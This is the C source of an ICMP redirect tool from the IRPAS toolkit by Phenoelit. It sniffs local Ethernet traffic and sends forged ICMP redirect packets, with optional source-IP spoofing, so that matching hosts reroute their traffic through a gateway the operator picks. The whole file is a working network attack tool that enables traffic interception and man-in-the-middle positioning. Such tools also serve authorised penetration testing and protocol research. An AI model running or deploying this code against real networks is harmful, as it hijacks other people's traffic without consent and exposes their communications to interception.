/* ICMP local redirector 
 *
 * FX <fx@phenoelit.de>
 * Phenoelit (http://www.phenoelit.de)
 * (c) 2k++
 *
 * $Id: icmp_redirect.c,v 1.3 2001/07/03 20:00:10 fx Exp $
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <rpc/types.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <time.h>

#include "protocols.h"
#include "packets.h"
#include "build.h"

#include <pcap.h>
#include <net/bpf.h>

/* definitions */
#define IPTTL		0x80

#define CAPLENGTH	1542
//#define DEST_LENGTH	15
#define DEFAULT_DELAY	3

#define BANNER		"ICMP local redirector $Revision: 1.3 $\n"\
			"\t(c) 2k++ FX <fx@phenoelit.de>\n"\
			"\tPhenoelit (http://www.phenoelit.de)\n"

typedef struct {
    struct in_addr	src;
    struct in_addr	dest;
    unsigned long	t;
    void		*next;
} found_t;

/* config */
struct {
    int			verbose;
    char		*device;

    u_int32_t		tnet, tmask;
    u_int32_t		snet, smask;

    int			spoof_src;
    struct in_addr	src;
    struct in_addr	gw;
    unsigned int	delay;
} cfg;


/*
 * globals 
 */
u_char			*rawpacket;
int			icmpsfd;
pcap_t			*cap;
found_t			*fanchor;

sig_atomic_t		stop_flag=0;


/************************************
 * prototypes */
void	usage(char *n);

u_char	*construct_icmp_redirect(struct in_addr *dest,
	struct in_addr *newgw, int *psize,
	u_char *iporig, unsigned int iporig_length);

/* PCAP */
int     initialize_pcap(void);
void	signaler(int sig);
void	evaluate_packet(u_char *frame,int frame_length);
void 	net_listen(void);

void 	add_con(struct in_addr *src,struct in_addr *dest);
found_t *con(struct in_addr *src, struct in_addr *dest);
void 	free_cons(void);


/* the main function */
int	main(int argc, char **argv) {
    char		option;
    extern char		*optarg;
    struct in_addr	temp;
    char		*inet,*imask;


    memset(&cfg,0,sizeof(cfg));
    cfg.delay=DEFAULT_DELAY;
    while ((option=getopt(argc,argv,"vi:S:G:d:s:w:"))!=EOF) {
	switch (option) {
	    case 'v':	/* verbose */
			cfg.verbose++;
			break;
	    case 'i':	/* local network device */
			cfg.device=smalloc(strlen(optarg)+1);
			strcpy(cfg.device,optarg);
			break;
			break;
	    case 'S':	/* spoof source */
			if (inet_aton(optarg,&(cfg.src))==0) {
			    fprintf(stderr,
				    "source IP address seems to be wrong\n");
			    return (1);
			}
			cfg.spoof_src++;
			break;
	    case 'G':	/* set destination */
			if (inet_aton(optarg,&(cfg.gw))==0) {
			    fprintf(stderr,
				    "dest. IP address seems to be wrong\n");
			    return (1);
			}
			break;
	    case 'd':	inet=smalloc(strlen(optarg)+1);
			strcpy(inet,optarg);
			if ((imask=strchr(inet,'/'))==NULL) {
			    usage(argv[0]);
			    /* does not return */
			} 
			imask[0]='\0';
			imask++;
			if (!inet_aton(inet,&temp)) {
			    fprintf(stderr,"Target network %s incorrect\n",
				    inet);
			    return (1);
			}
			cfg.tnet=ntohl(*((u_int32_t*)&(temp.s_addr)));
			if (!inet_aton(imask,&temp)) {
			    fprintf(stderr,"Target netmask %s incorrect\n",
				    inet);
			    return (1);
			}
			cfg.tmask=ntohl(*((u_int32_t*)&(temp.s_addr)));
			/* make the net flat ;) */
			cfg.tnet=cfg.tnet&cfg.tmask;
			free(inet);
			break;
	    case 's':	inet=smalloc(strlen(optarg)+1);
			strcpy(inet,optarg);
			if ((imask=strchr(inet,'/'))==NULL) {
			    usage(argv[0]);
			    /* does not return */
			} 
			imask[0]='\0';
			imask++;
			if (!inet_aton(inet,&temp)) {
			    fprintf(stderr,"Target network %s incorrect\n",
				    inet);
			    return (1);
			}
			cfg.snet=ntohl(*((u_int32_t*)&(temp.s_addr)));
			if (!inet_aton(imask,&temp)) {
			    fprintf(stderr,"Target netmask %s incorrect\n",
				    inet);
			    return (1);
			}
			cfg.smask=ntohl(*((u_int32_t*)&(temp.s_addr)));
			/* make the net flat ;) */
			cfg.snet=cfg.snet&cfg.smask;
			free(inet);
			break;
	    case 'w':	cfg.delay=atoi(optarg);
			break;
	    default:	usage(argv[0]);
	}
    }

    if (!cfg.device) usage(argv[0]);

    /*
     * TODO: add output on what we are about to do 
     */
	

    /* set up ICMP sender socket (IP) */
    if ((icmpsfd=init_socket_IP4(cfg.device,0))<0) return (-1);
    
    /* if spoofing is enabled, copy it */
    if (!cfg.spoof_src) {
	memcpy(&(cfg.src.s_addr), &(packet_ifconfig.ip.s_addr), IP_ADDR_LEN);
    }
    /* set up sniffer */
    if (initialize_pcap()==(-1)) return (1);

    /* signal handling */
    signal(SIGTERM,&signaler);
    signal(SIGABRT,&signaler);
    signal(SIGINT,&signaler);

    /* my shit */
    printf(BANNER); printf("\tIRPAS build %s\n",BUILD);

    while (!stop_flag) net_listen();

    /* at the end of the day, close our socket */
    pcap_close(cap);
    close(icmpsfd);
    free_cons();

    return (0);
}




/********************** FUNCTIONS **********************/

void 	net_listen(void) {
    u_char		*pcap_data, *ppacket;
    struct pcap_pkthdr	pcap_head,phead;

    if ((pcap_data=(u_char *)pcap_next(cap,&pcap_head))!=NULL) {
	/* make a local copy of the data, 
	 * pcap will overwrite the buffer if needed */
	memcpy(&phead,&pcap_head,sizeof(struct pcap_pkthdr));
	ppacket=(u_char *)smalloc(phead.caplen);
	memcpy(ppacket,pcap_data,phead.caplen);

	evaluate_packet(ppacket,phead.caplen);

	free(ppacket);
    }
}

void	evaluate_packet(u_char *frame,int frame_length) {
    struct ether_header		*eth;
    iphdr_t			*ip;
    u_char			*icp;
    int				icl;
    found_t			*c;
    
    if (frame_length<sizeof(iphdr_t)+sizeof(struct ether_header)) return;
    eth=(struct ether_header *)frame;
    if (ntohs(eth->ether_type)==ETHERTYPE_IP) {

	ip=(iphdr_t *)(frame+sizeof(struct ether_header));

	/* if it is from myself, igore it */
	if (!memcmp(&(ip->saddr),
		    &(packet_ifconfig.ip.s_addr),IP_ADDR_LEN)) return;
	if (cfg.verbose>2) printf("\tnot me\n");
	/* if it is from the spoofed self, igore it */
	if (!memcmp(&(ip->saddr),&(cfg.src),IP_ADDR_LEN)) return;

	/* does it match the destination and source ? */
	if ( 
		((ntohl(*((u_int32_t*)&(ip->daddr.s_addr)))&cfg.tmask)
		 ==cfg.tnet)
		&&
		((ntohl(*((u_int32_t*)&(ip->saddr.s_addr)))&cfg.smask)
		 ==cfg.snet)
		){
	    if (cfg.verbose>1) {
		printf(" %s ",inet_ntoa(ip->saddr));
		printf("to %s matches ",inet_ntoa(ip->daddr));
		printf("- redirect to %s\n",inet_ntoa(cfg.gw));
	    }
	    
	    c=con(&(ip->saddr),&(ip->daddr));
	    if (
		    (c==NULL)
		    ||
		    ((c->t+(unsigned long)cfg.delay)<(unsigned long)time(NULL)) 
		    ){
		icp=construct_icmp_redirect(&(ip->saddr),&(cfg.gw),&icl,
			(u_char *)ip,frame_length-sizeof(struct ether_header));
		sendpack_IP4(icmpsfd,icp,icl);
		free(icp);

		if (cfg.verbose) {
		    if(c==NULL) {
			printf("  New traffic path %s ",inet_ntoa(ip->saddr));
			printf("> %s \n",inet_ntoa(ip->daddr));
		    }
		}
		add_con(&(ip->saddr),&(ip->daddr));
	    } else if (cfg.verbose>1) 
		printf("  Traffic path redirected %lu secs ago."
			" Keeping silence.\n",
			(unsigned long)time(NULL)-c->t);
	} else return;
    } /* not IP */ 
}



void	signaler(int sig) {
    stop_flag++;
    if (cfg.verbose>2)
	fprintf(stderr,"\nSignal received.\n");
    pcap_close(cap);
}


int	initialize_pcap(void) {
#define PATTERNSTRING	"not src host "
#define IPSTRLEN	16
    char                pcap_err[PCAP_ERRBUF_SIZE]; /* buffer for pcap errors */
    struct bpf_program  cfilter;                   /* the compiled filter */
    bpf_u_int32		network,netmask;

    char		tipstr[IPSTRLEN+1];
    char		*notfilter;

    /* prepare filter */
    memset(&tipstr,0,IPSTRLEN+1);
    strcpy(tipstr,inet_ntoa(cfg.src));
    notfilter=(char *)smalloc(strlen(PATTERNSTRING)+IPSTRLEN+1);
    strcpy(notfilter,PATTERNSTRING);
    strcat(notfilter,tipstr);

    /* get my network and netmask */
    if (pcap_lookupnet(cfg.device,&network,&netmask,pcap_err)!=0) {
	fprintf(stderr,"pcap_lookupnet(): %s\n",pcap_err);
	return (-1);
    }

    /* open the sniffer */
    if ((cap=pcap_open_live(cfg.device,CAPLENGTH,
		    1, /* in promi mode */
		    0, /* not timeouts */
		    pcap_err))==NULL) {
	fprintf(stderr,"pcap_open_live(): %s\n",pcap_err);
	return (-1);
    }

    if (pcap_datalink(cap)!=DLT_EN10MB) {
	fprintf(stderr,"works on Ethernet only, sorry.\n");
	return (-1);
    }

    if (pcap_compile(cap,&cfilter,notfilter,0,netmask)!=0) {
	pcap_perror(cap,"pcap_compile()");
	return (-1);
    }

    if (pcap_setfilter(cap,&cfilter)!=0) {
	pcap_perror(cap,"pcap_setfilter()");
	return (-1);
    }
    
    free(notfilter);
    return 0;
}


/* constructs the ICMP redirect
 * * Returns a pointer to the packet or NULL if failed
 * * returns also the size in *psize */
u_char	*construct_icmp_redirect(struct in_addr *dest,
	struct in_addr *newgw, int *psize,
	u_char *iporig, unsigned int iporig_length) {
    u_char			*tpacket;
    iphdr_t			*iph;
    icmp_redirect_t		*icmp;
    u_int16_t			cs;

    *psize=sizeof(icmp_redirect_t)+sizeof(iphdr_t);
    tpacket=(u_char *)smalloc(sizeof(icmp_redirect_t)+sizeof(iphdr_t)
	    +3 /* for my checksum function, which sometimes 
		  steps over the mark */
	    );

    /* make up IP packet */
    iph=(iphdr_t *)tpacket;

    iph->version=4;
    iph->ihl=sizeof(iphdr_t)/4;

    iph->tot_len=htons(*psize);
    iph->ttl=IPTTL;
    srand((unsigned int)time(NULL));
    iph->id=htons(1+(int) (65535.0*rand()/(RAND_MAX+1.0)));
    iph->protocol=IPPROTO_ICMP;

    memcpy(&(iph->saddr.s_addr),&(cfg.src.s_addr),IP_ADDR_LEN);
    memcpy(&(iph->daddr.s_addr),&(dest->s_addr),IP_ADDR_LEN);

    /* make up the icmp header */
    icmp=(icmp_redirect_t *)(tpacket+sizeof(iphdr_t));
    icmp->type=ICMP_REDIRECT;
    if (cfg.tmask==0xFFFFFFFF)
	icmp->code=ICMP_REDIR_HOST;
    else
	icmp->code=ICMP_REDIR_NET;
    memcpy(&(icmp->gateway),&(newgw->s_addr),IP_ADDR_LEN);
    memcpy(&(icmp->headerdata),
	    iporig,iporig_length>28?28:iporig_length);

    /* make up checksum */
    cs=chksum((u_char *)icmp,sizeof(icmp_redirect_t));
    icmp->checksum=cs;

    return tpacket;
}


void add_con(struct in_addr *src, struct in_addr *dest) {
    found_t		*c;

    if ((c=con(src,dest))!=NULL) {
	c->t=(unsigned long)time(NULL);
	return;
    }

    if ((c=fanchor)==NULL) {
	c=smalloc(sizeof(found_t));
	fanchor=c;
    } else {
	c=fanchor;
	while (c->next!=NULL) c=c->next;
	c->next=smalloc(sizeof(found_t));
	c=c->next;
    }
    memcpy(&(c->src.s_addr),&(src->s_addr),IP_ADDR_LEN);
    memcpy(&(c->dest.s_addr),&(dest->s_addr),IP_ADDR_LEN);
    c->t=(unsigned long)time(NULL);
}


found_t *con(struct in_addr *src, struct in_addr *dest) {
    found_t		*c;

    c=fanchor;
    while (c!=NULL) {
	if (
		(!memcmp(&(c->src.s_addr),&(src->s_addr),IP_ADDR_LEN))
		&&
		(!memcmp(&(c->dest.s_addr),&(dest->s_addr),IP_ADDR_LEN))
		) {
	    return c;
	}
	c=c->next;
    }
    return NULL;
}


void free_cons(void) {
    found_t		*c;

    if (cfg.verbose) printf("\nHistory:\n");
    c=fanchor;
    while (c!=NULL) {
	fanchor=c;
	if (cfg.verbose) {
	    printf("%15s > ",inet_ntoa(fanchor->src));
	    printf("%15s, last redirect %s",inet_ntoa(fanchor->dest),
		    ctime(&(fanchor->t)));
	}
	c=c->next;
	free(fanchor);
    }
}
	
	
void	usage(char *n) {
    printf(
	    "%s [-v[v[v]]] -i <interface> \n"
	    "\t[-s <source net>/<source mask>]\n"
	    "\t[-d <destination net>/<destination mask>]\n"
	    "\t[-G <gateway IP>] [-w <delay>]\n"
	    "\t[-S <ip address>]\n",
	    n);
    exit (1);
}
